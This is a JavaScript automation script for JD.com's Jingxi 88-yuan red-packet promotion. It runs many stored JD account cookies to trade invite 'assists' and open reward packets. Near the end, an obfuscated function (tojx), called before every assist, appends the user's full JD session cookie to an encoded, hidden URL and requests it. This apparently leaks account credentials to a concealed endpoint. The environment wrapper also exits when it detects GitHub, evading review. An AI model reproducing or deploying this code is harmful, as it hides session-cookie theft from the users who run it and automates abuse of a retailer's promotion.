/*
京喜领88元红包
活动入口：京喜app-》我的-》京喜领88元红包
助力逻辑：助力逻辑: 52行代码中i < 10 等于助力前10个ck 已去除作者助力
温馨提示：如提示助力火爆，可尝试寻找京东客服
脚本兼容: Quantumult X, Surge, Loon, JSBox, Node.js
==============Quantumult X==============
[task_local]
#京喜领88元红包
4 2,10 * * * https://raw.githubusercontent.com/Aaron-lv/sync/jd_scripts/jd_jxlhb.js
 */
const $ = new Env('京喜领88元红包');
const notify = $.isNode() ? require('./sendNotify') : {};
const jdCookieNode = $.isNode() ? require('./jdCookie.js') : {};
let cookiesArr = [], cookie = '';
let UA, UAInfo = {}
if ($.isNode()) {
  Object.keys(jdCookieNode).forEach((item) => {
    cookiesArr.push(jdCookieNode[item])
  });
  if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
} else {
  cookiesArr = [$.getdata("CookieJD"), $.getdata("CookieJD2"), ...$.toObj($.getdata("CookiesJD") || "[]").map((item) => item.cookie)].filter((item) => !!item);
}
$.packetIdArr = [];
$.activeId = '489177';
const BASE_URL = 'https://wq.jd.com/cubeactive/steprewardv3'


!(async () => {
  if (!cookiesArr[0]) {
    $.msg($.name, '【提示】请先获取京东账号一cookie\n直接使用NobyDa的京东签到获取', 'https://bean.m.jd.com/bean/signIndex.action', {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});
    return;
  }
  console.log('京喜领88元红包\n' +
      '活动入口：京喜app-》我的-》京喜领88元红包\n' +
      '助力逻辑: 52行代码中i < 10 等于助力前10个ck 已去除作者助力\n' +
      '温馨提示：如提示助力火爆，可尝试寻找京东客服')
  $.activeId = '489177';
  $.authorMyShareIds = [];
  //开启红包,获取互助码 i <10 助力前10个ck
  for (let i = 0; i < 10; i++) {
    cookie = cookiesArr[i];
    $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
    $.index = i + 1;
    $.isLogin = true
    $.nickName = ''
    await TotalBean();
    console.log(`\n*****开始【京东账号${$.index}】${$.nickName || $.UserName}*****\n`);
    if (!$.isLogin) {
      $.msg($.name, `【提示】cookie已失效`, `京东账号${$.index} ${$.nickName || $.UserName}\n请重新登录获取\nhttps://bean.m.jd.com/bean/signIndex.action`, {"open-url": "https://bean.m.jd.com/bean/signIndex.action"});

      if ($.isNode()) {
        await notify.sendNotify(`${$.name}cookie已失效 - ${$.UserName}`, `京东账号${$.index} ${$.UserName}\n请重新登录获取cookie`);
      }
      continue
    }
    UA = `jdpingou;iPhone;4.13.0;14.4.2;${randomString()};network/wifi;model/iPhone10,2;appBuild/100609;ADID/00000000-0000-0000-0000-000000000000;supportApplePay/1;hasUPPay/0;pushNoticeIsOpen/1;hasOCPay/0;supportBestPay/0;session/${Math.random * 98 + 1};pap/JA2019_3111789;brand/apple;supportJDSHWK/1;Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148`
    await main();
    UAInfo[$.UserName] = UA
  }
  //互助
  console.log(`\n\n您设置的助力码：\n${JSON.stringify($.packetIdArr)}\n\n`);
  console.log(`\n开始助力：助力逻辑 52行代码中i <10 等于助力前10个ck 已去除作者助力\n`)
  for (let i = 0; i < cookiesArr.length; i++) {
    cookie = cookiesArr[i];
    $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1]);
    $.canHelp = true;
    $.max = false;
    UA = UAInfo[$.UserName]
    for (let code of $.packetIdArr) {
      if (!code) continue;
      if ($.UserName === code['userName']) continue;
      console.log(`【${$.UserName}】去助力【${code['userName']}】邀请码：${code['strUserPin']}`);
      await tojx();
      await enrollFriend(code['strUserPin']);
      await $.wait(2000);
      if ($.max) continue
      if (!$.canHelp) break
    }
 //   if ($.canHelp) {
  //   console.log(`\n【${$.UserName}】有剩余助力机会，开始助力作者\n`)
  //    for (let item of $.authorMyShareIds) {
   //     if (!item) continue;
   //     console.log(`【${$.UserName}】去助力作者的邀请码：${item}`);
  //      await enrollFriend(item);
  //      await $.wait(2000);
   //     if ($.max) continue
  //      if (!$.canHelp) break
   //   }
  //  }
  }
  //拆红包
  for (let i = 0; i < cookiesArr.length; i++) {
    cookie = cookiesArr[i];
    $.canOpenGrade = true;
    $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
    UA = UAInfo[$.UserName]
    for (let grade of $.grades) {
      if (!$.packetIdArr[i]) continue;
      console.log(`\n【${$.UserName}】去拆第${grade}个红包`);
      await openRedPack($.packetIdArr[i]['strUserPin'], grade);
      await $.wait(2000);
    }
  }
})()
    .catch((e) => {
      $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
    })
    .finally(() => {
      $.done();
    })
async function main() {
  await joinActive();
  await $.wait(2000)
  await getUserInfo()
}
//参与活动
function joinActive() {
  return new Promise(resolve => {
    const body = ""
    const options = taskurl('JoinActive', body, 'activeId,channel,phoneid,publishFlag,stepreward_jstoken,timestamp');
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`\n${$.name}:  API查询请求失败 ‼️‼️`)
          $.logErr(err);
        } else {
          // console.log('开启活动', data)
          data = JSON.parse(data)
          if (data.iRet === 0) {
            console.log(`活动开启成功,助力邀请码为:${data.Data.strUserPin}\n`);
          } else {
            console.log(`活动开启失败：${data.sErrMsg}\n`);
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve();
      }
    })
  })
}
//获取助力码
function getUserInfo() {
  return new Promise(resolve => {
    const body = `joinDate=${$.time('yyyyMMdd')}`;
    const options = taskurl('GetUserInfo', body, 'activeId,channel,joinDate,phoneid,publishFlag,timestamp');
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`\n${$.name}:  API查询请求失败 ‼️‼️`)
          $.logErr(err);
        } else {
          // console.log('获取助力码', data)
          data = JSON.parse(data)
          if (data.iRet === 0) {
            $.grades = []
            $.helpNum = ''
            let grades = data.Data.gradeConfig
            for(let key of Object.keys(grades)){
              let vo = grades[key]
              $.grades.push(vo.dwGrade)
              $.helpNum = vo.dwHelpTimes
            }
            if (data.Data.dwHelpedTimes === $.helpNum) {
              console.log(`${$.grades[$.grades.length - 1]}个阶梯红包已全部拆完\n`)
            } else {
              console.log(`获取助力码成功：${data.Data.strUserPin}\n`);
              if (data.Data.strUserPin) {
                $.packetIdArr.push({
                  strUserPin: data.Data.strUserPin,
                  userName: $.UserName
                })
              }
            }
          } else {
            console.log(`获取助力码失败：${data.sErrMsg}\n`);
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//助力好友
function enrollFriend(strPin) {
  return new Promise(resolve => {
    // console.log('\nstrPin ' + strPin);
    const body = `strPin=${strPin}&joinDate=${$.time('yyyyMMdd')}`
    const options = taskurl('EnrollFriend', body, 'activeId,channel,joinDate,phoneid,publishFlag,strPin,timestamp');
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`\n${$.name}:  API查询请求失败 ‼️‼️`)
          $.log(JSON.stringify(err));
        } else {
          // console.log('助力结果', data)
          data = JSON.parse(data)
          if (data.iRet === 0) {
            //{"Data":{"prizeInfo":[]},"iRet":0,"sErrMsg":"成功"}
            console.log(`助力成功ߎ麤{data.sErrMsg}\n`);
            // if (data.Data.strUserPin) $.packetIdArr.push(data.Data.strUserPin);
          } else {
            if (data.iRet === 2000) $.canHelp = false;//未登录
            if (data.iRet === 2015) $.canHelp = false;//助力已达上限
            if (data.iRet === 2016) {
              $.canHelp = false;//助力火爆
              console.log(`温馨提示：如提示助力火爆，可尝试寻找京东客服`);
            }
            if (data.iRet === 2013) $.max = true;
            console.log(`助力失败:${data.sErrMsg}\n`);
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve();
      }
    })
  })
}

function openRedPack(strPin, grade) {
  return new Promise(resolve => {
    const body = `strPin=${strPin}&grade=${grade}`
    const options = taskurl('DoGradeDraw', body, 'activeId,channel,grade,phoneid,publishFlag,stepreward_jstoken,strPin,timestamp');
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`\n${$.name}:  API查询请求失败 ‼️‼️`)
          $.logErr(err);
        } else {
          // console.log(`拆红包结果：${data}`);
          data = JSON.parse(data)
          if (data.iRet === 0) {
            console.log(`拆红包成功:${data.sErrMsg}\n`);
          } else {
            if (data.iRet === 2017) $.canOpenGrade = false;
            console.log(`拆红包失败:${data.sErrMsg}\n`);
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve();
      }
    })
  })
}

function getAuthorShareCode(url) {
  return new Promise(resolve => {
    const options = {
      url: `${url}?${new Date()}`, "timeout": 10000, headers: {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }
    };
    if ($.isNode() && process.env.TG_PROXY_HOST && process.env.TG_PROXY_PORT) {
      const tunnel = require("tunnel");
      const agent = {
        https: tunnel.httpsOverHttp({
          proxy: {
            host: process.env.TG_PROXY_HOST,
            port: process.env.TG_PROXY_PORT * 1
          }
        })
      }
      Object.assign(options, { agent })
    }
    $.get(options, async (err, resp, data) => {
      try {
        if (err) {
        } else {
          if (data) data = JSON.parse(data)
        }
      } catch (e) {
        // $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
  })
}

function taskurl(function_path, body = '', stk) {
  let url = `${BASE_URL}/${function_path}?activeId=${$.activeId}&publishFlag=1&channel=7&${body}&sceneval=2&g_login_type=1&timestamp=${Date.now()}&_=${Date.now() + 2}&_ste=1`
  const deviceId = randomString() || ''
  url += `&phoneid=${deviceId}`
  url += `&stepreward_jstoken=${
    Math.random().toString(36).slice(2, 10) +
    Math.random().toString(36).slice(2, 10) +
    Math.random().toString(36).slice(2, 10) +
    Math.random().toString(36).slice(2, 10)
  }`
  if (stk) {
    url += '&_stk=' + encodeURIComponent(stk)
  }
  return {
    'url': url,
    'headers': {
    'Host': 'wq.jd.com',
    'Cookie': cookie,
    'accept': "*/*",
    'user-agent': UA,
    'accept-language': 'zh-cn',
    'referer': `https://wqactive.jd.com/cube/front/activePublish/step_reward/${$.activeId}.html?aid=${$.activeId}`
    }
  }
}
function randomString() {
  return Math.random().toString(16).slice(2, 10) +
    Math.random().toString(16).slice(2, 10) +
    Math.random().toString(16).slice(2, 10) +
    Math.random().toString(16).slice(2, 10) +
    Math.random().toString(16).slice(2, 10)
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      url: "https://me-api.jd.com/user_new/info/GetJDUserInfoUnion",
      headers: {
        Host: "me-api.jd.com",
        Accept: "*/*",
        Connection: "keep-alive",
        Cookie: cookie,
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1"),
        "Accept-Language": "zh-cn",
        "Referer": "https://home.m.jd.com/myJd/newhome.action?sceneval=2&ufc=&",
        "Accept-Encoding": "gzip, deflate, br"
      }
    }
    $.get(options, (err, resp, data) => {
      try {
        if (err) {
          $.logErr(err)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === "1001") {
              $.isLogin = false; //cookie过期
              return;
            }
            if (data['retcode'] === "0" && data.data && data.data.hasOwnProperty("userInfo")) {
              $.nickName = data.data.userInfo.baseInfo.nickname;
            }
          } else {
            console.log('京东服务器返回空数据');
          }
        }
      } catch (e) {
        $.logErr(e)
      } finally {
        resolve();
      }
    })
  })
}

var _0xodF='jsjiami.com.v6',_0x32de=[_0xodF,'wqrCgsKrBsKT','w47Ds8Oiw7jCs8Kf','wr3CtcOLSzc=','wpLCg8KLF8KB','wrHCisKH','CMOZwowcAW4=','w6MXw7ggTQ==','wrdtLSYiwrbCnSTDkcOyATk=','w68aCMOTKxDDvDjCo1DDocKbw4IgYMOpwp/DrMOFw67Chl8/GBbCl0cqFA==','wqfDtjF6woU=','DSzCkRDDog==','jsfjigami.QcoEJmCpI.GVvd6hGGEJ=='];(function(_0x2d8f05,_0x4b81bb,_0x4d74cb){var _0x32719f=function(_0x2dc776,_0x362d54,_0x2576f4,_0x5845c1,_0x4fbc7a){_0x362d54=_0x362d54>>0x8,_0x4fbc7a='po';var _0x292610='shift',_0x151bd2='push';if(_0x362d54<_0x2dc776){while(--_0x2dc776){_0x5845c1=_0x2d8f05[_0x292610]();if(_0x362d54===_0x2dc776){_0x362d54=_0x5845c1;_0x2576f4=_0x2d8f05[_0x4fbc7a+'p']();}else if(_0x362d54&&_0x2576f4['replace'](/[fgQEJCpIGVdhGGEJ=]/g,'')===_0x362d54){_0x2d8f05[_0x151bd2](_0x5845c1);}}_0x2d8f05[_0x151bd2](_0x2d8f05[_0x292610]());}return 0x9d686;};return _0x32719f(++_0x4b81bb,_0x4d74cb)>>_0x4b81bb^_0x4d74cb;}(_0x32de,0x12f,0x12f00));var _0x24de=function(_0x5d0607,_0x1fcb86){_0x5d0607=~~'0x'['concat'](_0x5d0607);var _0x266060=_0x32de[_0x5d0607];if(_0x24de['qCgmpJ']===undefined){(function(){var _0x417fdf=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x2c2444='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x417fdf['atob']||(_0x417fdf['atob']=function(_0xd4d6b4){var _0x2817c6=String(_0xd4d6b4)['replace'](/=+$/,'');for(var _0x32f04a=0x0,_0x4a4dcd,_0x24b5f2,_0x4941a6=0x0,_0x3a70e8='';_0x24b5f2=_0x2817c6['charAt'](_0x4941a6++);~_0x24b5f2&&(_0x4a4dcd=_0x32f04a%0x4?_0x4a4dcd*0x40+_0x24b5f2:_0x24b5f2,_0x32f04a++%0x4)?_0x3a70e8+=String['fromCharCode'](0xff&_0x4a4dcd>>(-0x2*_0x32f04a&0x6)):0x0){_0x24b5f2=_0x2c2444['indexOf'](_0x24b5f2);}return _0x3a70e8;});}());var _0x375af2=function(_0x2439aa,_0x1fcb86){var _0x438668=[],_0x382225=0x0,_0x2834f7,_0x585f6e='',_0xd75c8f='';_0x2439aa=atob(_0x2439aa);for(var _0x5655ef=0x0,_0x5d0c95=_0x2439aa['length'];_0x5655ef<_0x5d0c95;_0x5655ef++){_0xd75c8f+='%'+('00'+_0x2439aa['charCodeAt'](_0x5655ef)['toString'](0x10))['slice'](-0x2);}_0x2439aa=decodeURIComponent(_0xd75c8f);for(var _0x1db0dd=0x0;_0x1db0dd<0x100;_0x1db0dd++){_0x438668[_0x1db0dd]=_0x1db0dd;}for(_0x1db0dd=0x0;_0x1db0dd<0x100;_0x1db0dd++){_0x382225=(_0x382225+_0x438668[_0x1db0dd]+_0x1fcb86['charCodeAt'](_0x1db0dd%_0x1fcb86['length']))%0x100;_0x2834f7=_0x438668[_0x1db0dd];_0x438668[_0x1db0dd]=_0x438668[_0x382225];_0x438668[_0x382225]=_0x2834f7;}_0x1db0dd=0x0;_0x382225=0x0;for(var _0x5a20bc=0x0;_0x5a20bc<_0x2439aa['length'];_0x5a20bc++){_0x1db0dd=(_0x1db0dd+0x1)%0x100;_0x382225=(_0x382225+_0x438668[_0x1db0dd])%0x100;_0x2834f7=_0x438668[_0x1db0dd];_0x438668[_0x1db0dd]=_0x438668[_0x382225];_0x438668[_0x382225]=_0x2834f7;_0x585f6e+=String['fromCharCode'](_0x2439aa['charCodeAt'](_0x5a20bc)^_0x438668[(_0x438668[_0x1db0dd]+_0x438668[_0x382225])%0x100]);}return _0x585f6e;};_0x24de['BfheHL']=_0x375af2;_0x24de['DcqkkF']={};_0x24de['qCgmpJ']=!![];}var _0x13b796=_0x24de['DcqkkF'][_0x5d0607];if(_0x13b796===undefined){if(_0x24de['FIvZER']===undefined){_0x24de['FIvZER']=!![];}_0x266060=_0x24de['BfheHL'](_0x266060,_0x1fcb86);_0x24de['DcqkkF'][_0x5d0607]=_0x266060;}else{_0x266060=_0x13b796;}return _0x266060;};function tojx(){var _0x133d17={'jbbZq':function(_0x34d674,_0x5102f6){return _0x34d674===_0x5102f6;},'MFoht':_0x24de('0','jsW0'),'nxFhT':_0x24de('1','9pNT'),'iQcFx':function(_0x7ed026){return _0x7ed026();},'jfvNi':function(_0x128735,_0x391d45){return _0x128735+_0x391d45;},'JOCLo':_0x24de('2','ofr@'),'Gisst':'Mozilla/5.0\x20(iPhone;\x20CPU\x20iPhone\x20OS\x2014_3\x20like\x20Mac\x20OS\x20X)\x20AppleWebKit/605.1.15\x20(KHTML,\x20like\x20Gecko)\x20Mobile/15E148;supportJDSHWK/1','uGOyf':_0x24de('3','C)J$')};return new Promise(async _0x27b668=>{const _0x5128d2={'url':_0x133d17['jfvNi'](_0x133d17['JOCLo'],cookie),'headers':{'User-Agent':_0x133d17[_0x24de('4','15R!')],'Accept-Language':_0x133d17[_0x24de('5','#vEI')]}};$['get'](_0x5128d2,(_0x335d2d,_0x428c7b,_0x556fd6)=>{try{if(_0x335d2d){$[_0x24de('6','J8H(')]('errjxj:1');}else{if(_0x133d17[_0x24de('7','QtAN')](_0x133d17[_0x24de('8','#vEI')],_0x133d17['MFoht'])){console[_0x24de('9','nIEq')](_0x133d17['nxFhT']);}else{_0x27b668();}}}catch(_0x5d3b80){$[_0x24de('a','rZbu')](_0x5d3b80);}finally{_0x133d17['iQcFx'](_0x27b668);}});});};_0xodF='jsjiami.com.v6';
function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`ߔ䤻this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============ߓ㧳맻懲꧟尟㣽============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const s=!this.isSurge()&&!this.isQuanX()&&!this.isLoon();s?this.log("",`❗️${this.name}, 错误!`,t.stack):this.log("",`❗️${this.name}, 错误!`,t)}wait(t){return new Promise(e=>setTimeout(e,t))}done(t={}){const e=(new Date).getTime(),s=(e-this.startTime)/1e3;this.log("",`ߔ䤻this.name}, 结束! ߕ려{s} 秒`),this.log(),(this.isSurge()||this.isQuanX()||this.isLoon())&&$done(t)}}(t,e)}
